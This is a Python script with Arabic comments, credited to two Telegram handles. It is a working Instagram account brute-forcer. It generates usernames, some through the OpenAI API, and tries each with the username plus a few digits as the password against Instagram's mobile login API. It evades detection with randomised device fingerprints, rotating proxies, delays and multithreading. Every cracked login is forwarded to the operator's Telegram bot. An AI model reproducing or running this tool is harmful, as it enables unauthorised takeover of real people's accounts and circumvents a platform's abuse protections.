

import json
import requests
import random
import time,sys
import concurrent.futures
from rich.panel import Panel
from user_agent import generate_user_agent
import telebot
import threading
import openai
import os
import uuid
import hashlib
import string

g=0
bb=0
b=0

# متغيرات للأسماء المولدة
generated_names = []
name_index = 0

# متغيرات للبروكسي
proxy_list = []
proxy_index = 0

# إعدادات التحسين
REQUEST_DELAY_MIN = 1.0  # الحد الأدنى للتأخير بين الطلبات
REQUEST_DELAY_MAX = 3.0  # الحد الأقصى للتأخير بين الطلبات
MAX_RETRIES = 3  # عدد المحاولات عند الفشل

# قوائم للأجهزة والمتصفحات المختلفة
DEVICE_MODELS = [
    "SM-G975F", "SM-G973F", "SM-G970F", "SM-N975F", "SM-N973F", "SM-N970F",
    "SM-A505F", "SM-A705F", "SM-A305F", "SM-A805F", "SM-A905F", "SM-A515F",
    "SM-T870", "SM-T875", "SM-T860", "SM-T865", "SM-T720", "SM-T725",
    "SM-G981B", "SM-G986B", "SM-G988B", "SM-G991B", "SM-G996B", "SM-G998B",
    "Pixel 6", "Pixel 6 Pro", "Pixel 5", "Pixel 4a", "Pixel 4 XL", "Pixel 3a",
    "OnePlus 9", "OnePlus 8T", "OnePlus 8 Pro", "OnePlus 7T", "OnePlus 7 Pro",
    "Redmi Note 10", "Redmi Note 9", "Redmi 9", "POCO X3", "Mi 11", "Mi 10"
]

DEVICE_BRANDS = ["samsung", "google", "oneplus", "xiaomi", "huawei", "oppo", "vivo", "realme", "nokia", "sony"]

ANDROID_VERSIONS = ["11", "12", "13", "14"]

RESOLUTIONS = [
    "1080x2400", "1080x2340", "1080x2280", "1080x2220", "1080x2160",
    "1440x3200", "1440x3168", "1440x3120", "1440x3084", "1440x3048",
    "720x1600", "720x1560", "720x1520", "720x1480", "720x1440"
]

DPI_VALUES = ["420dpi", "480dpi", "560dpi", "640dpi"]

LOCALES = ["en_US", "en_GB", "ar_SA", "fr_FR", "de_DE", "es_ES", "it_IT", "pt_BR", "ru_RU", "ja_JP", "ko_KR", "zh_CN"]

def generate_random_device_id():
    """توليد معرف جهاز عشوائي"""
    return f"android-{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}"

def generate_random_guid():
    """توليد GUID عشوائي"""
    return str(uuid.uuid4())

def generate_random_android_id():
    """توليد Android ID عشوائي"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

def generate_random_session_id():
    """توليد معرف جلسة عشوائي"""
    return str(uuid.uuid4())

def generate_random_mid():
    """توليد MID عشوائي"""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=22))

def generate_random_phone_id():
    """توليد معرف هاتف عشوائي"""
    return str(uuid.uuid4())

def generate_random_adid():
    """توليد معرف إعلان عشوائي"""
    return str(uuid.uuid4())

def generate_dynamic_headers():
    """توليد headers ديناميكية ومتغيرة"""
    device_model = random.choice(DEVICE_MODELS)
    device_brand = random.choice(DEVICE_BRANDS)
    android_version = random.choice(ANDROID_VERSIONS)
    resolution = random.choice(RESOLUTIONS)
    dpi = random.choice(DPI_VALUES)
    locale = random.choice(LOCALES)
    
    # توليد قيم عشوائية
    device_id = generate_random_device_id()
    guid = generate_random_guid()
    android_id = generate_random_android_id()
    session_id = generate_random_session_id()
    mid = generate_random_mid()
    phone_id = generate_random_phone_id()
    adid = generate_random_adid()
    
    # توليد User-Agent ديناميكي
    user_agent = f"Instagram 219.0.0.12.117 Android ({android_version}/6.0; {dpi}; {resolution}; {device_brand}; {device_model}; {device_model.lower()}; qcom; {locale})"
    
    # توليد قيم الوقت
    current_time = str(int(time.time() * 1000)).split('.')[0]
    timezone_offset = random.randint(-43200, 43200)  # -12 to +12 hours
    
    # توليد سرعة اتصال عشوائية
    connection_speed = random.randint(1000, 5000)
    bandwidth_speed = round(random.uniform(-1.0, 10.0), 3)
    
    headers = {
        'User-Agent': user_agent,
        'Accept-Encoding': "gzip, deflate",
        'Content-Type': "application/x-www-form-urlencoded",
        'x-pigeon-session-id': session_id,
        'x-ig-connection-speed': f"{connection_speed}kbps",
        'x-ig-app-locale': locale,
        'x-bloks-is-layout-rtl': "false",
        'x-fb-client-ip': "True",
        'x-ig-bandwidth-speed-kbps': f"{bandwidth_speed}",
        'x-ig-device-locale': locale,
        'accept-language': locale.replace('_', '-'),
        'x-bloks-version-id': hashlib.sha256(f"{device_id}{current_time}".encode()).hexdigest(),
        'x-ig-device-id': device_id,
        'x-ig-bandwidth-totaltime-ms': str(random.randint(0, 1000)),
        'x-ig-connection-type': random.choice(["WIFI", "4G", "5G"]),
        'ig-intended-user-id': "0",
        'x-bloks-is-panorama-enabled': "true",
        'x-ig-app-id': "567067343352427",
        'x-mid': mid,
        'x-ig-www-claim': "0",
        'x-pigeon-rawclienttime': current_time,
        'x-fb-http-engine': "Liger",
        'x-ig-mapped-locale': locale,
        'x-ig-bandwidth-totalbytes-b': str(random.randint(0, 1000000)),
        'x-ig-capabilities': "3brTvx0=",
        'x-fb-server-cluster': "true",
        'x-ig-timezone-offset': str(timezone_offset),
        'x-ig-android-id': android_id,
        'X-Requested-With': "XMLHttpRequest",
        'Origin': "https://www.instagram.com",
        'Referer': "https://www.instagram.com/",
        'Accept': "*/*",
        'Accept-Language': locale.replace('_', '-') + ",en;q=0.9",
        'Connection': "keep-alive",
        'Sec-Fetch-Dest': "empty",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Site': "same-origin"
    }
    
    return headers, device_id, guid, android_id, session_id, phone_id, adid

def generate_dynamic_payload(email, password, device_id, guid, android_id, phone_id, adid):
    """توليد payload ديناميكي"""
    current_time = str(int(time.time() * 1000)).split('.')[0]
    
    # توليد قيم عشوائية
    jazoest = ''.join(random.choices('0123456789', k=5))
    country_code = random.choice(["1", "44", "33", "49", "34", "39", "55", "7", "81", "82", "86", "966", "971", "974"])
    
    payload_data = {
        "_csrftoken": "missing",
        "adid": adid,
        "country_codes": f'[{{"country_code":"{country_code}","source":["default","uig_via_phone_id"]}}]',
        "device_id": device_id,
        "google_tokens": "[]",
        "guid": guid,
        "login_attempt_count": "0",
        "jazoest": jazoest,
        "phone_id": phone_id,
        "username": email,
        "enc_password": f"#PWD_INSTAGRAM:0:{current_time}:{password}"
    }
    
    # تحويل إلى JSON ثم URL encode
    json_data = json.dumps(payload_data, separators=(',', ':'))
    encoded_data = json_data.replace('"', '%22').replace('{', '%7B').replace('}', '%7D').replace(':', '%3A').replace(',', '%2C')
    
    return f"signed_body=SIGNATURE.{encoded_data}"

def load_proxy_list():
    """تحميل قائمة البروكسي من ملف"""
    global proxy_list
    try:
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                proxy_list = [line.strip() for line in f.readlines() if line.strip()]
            print(f"[INFO] Loaded {len(proxy_list)} proxies from proxies.txt")
        else:
            print("[INFO] No proxies.txt found, using direct connection")
            proxy_list = []
    except Exception as e:
        print(f"[ERROR] Failed to load proxies: {e}")
        proxy_list = []

def get_next_proxy():
    """الحصول على البروكسي التالي"""
    global proxy_index
    if not proxy_list:
        return None
    
    proxy = proxy_list[proxy_index % len(proxy_list)]
    proxy_index += 1
    
    # تحويل تنسيق البروكسي
    if '://' in proxy:
        return proxy
    else:
        return f"http://{proxy}"

def create_session_with_proxy():
    """إنشاء جلسة مع بروكسي"""
    session = requests.Session()
    
    # إعداد البروكسي
    proxy = get_next_proxy()
    if proxy:
        session.proxies = {
            'http': proxy,
            'https': proxy
        }
    
    # إعداد headers افتراضية
    session.headers.update({
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    })
    
    return session

def make_request_with_retry(url, data, headers, max_retries=MAX_RETRIES):
    """إجراء طلب مع إعادة المحاولة"""
    for attempt in range(max_retries):
        try:
            # إنشاء جلسة جديدة مع بروكسي
            session = create_session_with_proxy()
            
            # إجراء الطلب
            response = session.post(url, data=data, headers=headers, timeout=15)
            
            if response.status_code == 200:
                return response.text
            elif response.status_code == 429:  # Rate limited
                print(f"[WARNING] Rate limited, waiting...")
                time.sleep(random.uniform(5, 10))
                continue
            else:
                print(f"[WARNING] HTTP {response.status_code}, retrying...")
                
        except requests.exceptions.ProxyError:
            print(f"[WARNING] Proxy error, trying next proxy...")
            continue
        except requests.exceptions.Timeout:
            print(f"[WARNING] Request timeout, retrying...")
            continue
        except Exception as e:
            print(f"[WARNING] Request failed: {e}, retrying...")
            continue
        
        # تبطيء بين المحاولات
        time.sleep(random.uniform(2, 5))
    
    print(f"[ERROR] Failed after {max_retries} attempts")
    return None

# دالة لتوليد الأسماء باستخدام OpenAI
def generate_names_with_openai(api_key, count=1000):
    """توليد أسماء باستخدام OpenAI API"""
    try:
        # إعداد OpenAI
        openai.api_key = api_key
        
        # إنشاء رسالة للـ prompt
        prompt = f"""Generate {count} unique usernames for Instagram. 
        Make them realistic and varied. Include:
        - Common names (Arabic, English, etc.)
        - Creative combinations
        - Some with numbers
        - Mix of styles
        
        Return only the usernames, one per line, no numbering or extra text."""
        
        # استدعاء OpenAI API
        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[
                {"role": "user", "content": prompt}
            ],
            max_tokens=4000,
            temperature=0.8
        )
        
        # استخراج الأسماء من الاستجابة
        names_text = response.choices[0].message.content.strip()
        names = [name.strip() for name in names_text.split('\n') if name.strip()]
        
        # إذا لم نحصل على العدد المطلوب، نكمل بقائمة افتراضية
        if len(names) < count:
            default_names = ['user', 'admin', 'test', 'demo', 'guest', 'new', 'old', 'pro', 'vip', 'king', 'queen', 'star', 'moon', 'sun', 'fire', 'ice', 'wind', 'earth', 'water', 'gold', 'silver', 'diamond', 'ruby', 'emerald', 'sapphire', 'pearl', 'crystal', 'magic', 'power', 'force', 'speed', 'light', 'dark', 'shadow', 'ghost', 'angel', 'devil', 'hero', 'legend', 'master', 'boss', 'chief', 'leader', 'winner', 'champion', 'victor', 'warrior', 'knight', 'prince', 'princess', 'emperor', 'empress', 'sultan', 'sultana']
            while len(names) < count:
                name = random.choice(default_names) + str(random.randint(1, 9999))
                if name not in names:
                    names.append(name)
        
        # حفظ الأسماء في ملف krar.txt
        with open('krar.txt', 'w', encoding='utf-8') as f:
            for name in names[:count]:
                f.write(name + '\n')
        
        print(f"[SUCCESS] Generated {len(names[:count])} names and saved to krar.txt")
        return names[:count]
        
    except Exception as e:
        print(f"[ERROR] Failed to generate names with OpenAI: {e}")
        print("[INFO] Using default names list...")
        
        # استخدام قائمة افتراضية في حالة فشل OpenAI
        default_names = ['user', 'admin', 'test', 'demo', 'guest', 'new', 'old', 'pro', 'vip', 'king', 'queen', 'star', 'moon', 'sun', 'fire', 'ice', 'wind', 'earth', 'water', 'gold', 'silver', 'diamond', 'ruby', 'emerald', 'sapphire', 'pearl', 'crystal', 'magic', 'power', 'force', 'speed', 'light', 'dark', 'shadow', 'ghost', 'angel', 'devil', 'hero', 'legend', 'master', 'boss', 'chief', 'leader', 'winner', 'champion', 'victor', 'warrior', 'knight', 'prince', 'princess', 'emperor', 'empress', 'sultan', 'sultana']
        names = []
        for i in range(count):
            name = random.choice(default_names) + str(random.randint(1, 9999))
            names.append(name)
        
        # حفظ الأسماء في ملف krar.txt
        with open('krar.txt', 'w', encoding='utf-8') as f:
            for name in names:
                f.write(name + '\n')
        
        print(f"[SUCCESS] Generated {len(names)} default names and saved to krar.txt")
        return names

# دالة لقراءة الأسماء من ملف krar.txt
def load_names_from_file():
    """قراءة الأسماء من ملف krar.txt"""
    try:
        if os.path.exists('krar.txt'):
            with open('krar.txt', 'r', encoding='utf-8') as f:
                names = [line.strip() for line in f.readlines() if line.strip()]
            return names
        else:
            return []
    except Exception as e:
        print(f"[ERROR] Failed to load names from file: {e}")
        return []

from colorama import Fore, Style, init
print (f'{Fore.RED}')
def print_krar():
	r"""
-----------.        .-----------
  ------    \  __  /    ------
    -----    \(  )/    -----
       ---   ' \/ `   ---
         --- :    : ---
           --`    '--
           `/`/..\`\`
        ====UU====UU====
            '//||\\`
              ''``
    Telegram : @J2J_2 , @RDRYY
	"""
	print(print_krar.__doc__)
	print(f'{Fore.WHITE}')
print_krar()

try:
	# تحميل قائمة البروكسي
	print(f'{Fore.CYAN}[INFO] Loading proxies...{Fore.WHITE}')
	load_proxy_list()
	
	# طلب مفتاح OpenAI
	print(f'{Fore.YELLOW}[INFO] Enter your OpenAI API key to generate names{Fore.WHITE}')
	openai_key = input('Enter OpenAI API Key: ')
	
	# توليد الأسماء باستخدام OpenAI
	print(f'{Fore.YELLOW}[INFO] Generating 1000 names with OpenAI...{Fore.WHITE}')
	generated_names = generate_names_with_openai(openai_key, 1000)
	
	token1=input('Enter Your Token : ')
	idd=input('Enter Your ID : ')
	bot=telebot.TeleBot(token1)
except:''
import os
os.system('clear')
def sin(email,password):
	
	global token1,idd,g,b,bb
	url = "https://i.instagram.com/api/v1/accounts/login/"
	
	# توليد headers ديناميكية
	headers, device_id, guid, android_id, session_id, phone_id, adid = generate_dynamic_headers()
	
	# توليد payload ديناميكي
	payload = generate_dynamic_payload(email, password, device_id, guid, android_id, phone_id, adid)
	
	# إضافة تبطيء عشوائي لتجنب الكشف
	time.sleep(random.uniform(REQUEST_DELAY_MIN, REQUEST_DELAY_MAX))
	
	# إجراء الطلب مع إعادة المحاولة والبروكسي
	req = make_request_with_retry(url, payload, headers)
	
	if not req:
		bb += 1
		sys.stdout.write(f"\r[\033[31m✗ BAD: {bb:>3}\033[0m] | [\033[33m◐ CP: {b:>3}\033[0m] | [\033[32m✓ OK: {g:>3}\033[0m] | \033[90m{email}/{password}\033[0m | \033[36mBy: @J2J_2\033[0m\r")
		return
	if "logged_in_user" in req:
		g+=1
		sys.stdout.write(f"\r \033[31m[BAD ] | {bb} \033[33m[CP]|{b}\033[32m[OK][{g}]\r")
		print(Panel(f'''[green]
ــــــــــــــــــــــــــــــــــــــــــــــــــ
The Gmail  : {email}  
The password {password} 
ــــــــــــــــــــــــــــــــــــــــــــــــــ
The Programmer : @J2J_2 , @RDRYY
'''))
		bot.send_message(chat_id=idd,text=f'''
ــــــــــــــــــــــــــــــــــــــــــــــــــ
The Gmail : {email}
The password {password}
ــــــــــــــــــــــــــــــــــــــــــــــــــ
The Programmer : @J2J_2 , @RDRYY 
	''')
	elif "checkpoint_challenge_required" in req or "checkpoint" in req:
		bot.send_message(chat_id=idd,text=f'''
cp	    	       
ــــــــــــــــــــــــــــــــــــــــــــــــــ
The Gmail : {email}
ــــــــــــــــــــــــــــــــــــــــــــــــــ

The Programmer : @J2J_2 , @RDRYY 
	''')
		b += 1
		sys.stdout.write(f"\r[\033[31m✗ BAD: {bb:>3}\033[0m] | [\033[33m◐ CP: {b:>3}\033[0m] | [\033[32m✓ OK: {g:>3}\033[0m] | \033[36mBy: @J2J_2\033[0m\r")
	else:
		bb += 1
		
		sys.stdout.write(f"\r[\033[31m✗ BAD: {bb:>3}\033[0m] | [\033[33m◐ CP: {b:>3}\033[0m] | [\033[32m✓ OK: {g:>3}\033[0m] | \033[90m{email}/{password}\033[0m | \033[36mBy: @J2J_2\033[0m\r")			
def com():
 global name_index, generated_names
 while True:
  # استخدام الأسماء المولدة من ملف krar.txt
  if generated_names and name_index < len(generated_names):
   names = generated_names[name_index]
   name_index += 1
  else:
   # إذا انتهت الأسماء، نعيد تحميلها من الملف أو نستخدم قائمة افتراضية
   if os.path.exists('krar.txt'):
    generated_names = load_names_from_file()
    if generated_names:
     names = generated_names[0] if generated_names else 'user'
     name_index = 1
    else:
     names = 'user'
   else:
    names = 'user'
  
  # إضافة أرقام عشوائية للاسم
  numbers1 = ''.join(random.choices('1234567890',k=random.randint(1,3)))
  password = names + numbers1
  email = f'{names}{numbers1}'
  sin(email,password)
prox_list=[]
for i in range(10):
  t = threading.Thread(target=com)
  t.start()
  prox_list.append(t)
com()
